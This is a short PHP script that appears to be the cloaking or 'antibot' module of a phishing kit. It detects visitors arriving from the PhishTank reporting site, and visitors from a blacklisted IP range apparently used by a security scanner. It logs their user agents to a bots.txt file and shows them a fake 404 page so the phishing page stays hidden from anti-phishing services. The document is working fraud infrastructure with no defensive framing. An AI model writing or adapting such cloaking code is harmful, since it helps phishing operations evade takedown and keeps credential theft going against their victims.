<?php

/**

**/
### Perform a HTTP REFERER check on the visitor to see if they are coming from the Phishtank website ###

		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
		    $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
		    $save=fopen("../bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

		}
		}

		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
		    $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
		    $save=fopen("../bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

		}
		}

 ### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
	$range_start = ip2long("146.112.0.0");
	$range_end   = ip2long("146.112.255.255");
	$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

	 if ($ip2long >= $range_start && $ip2long <= $range_end){
	    $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Blacklist ] \r\n";
		    $save=fopen("../bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

	 }



?>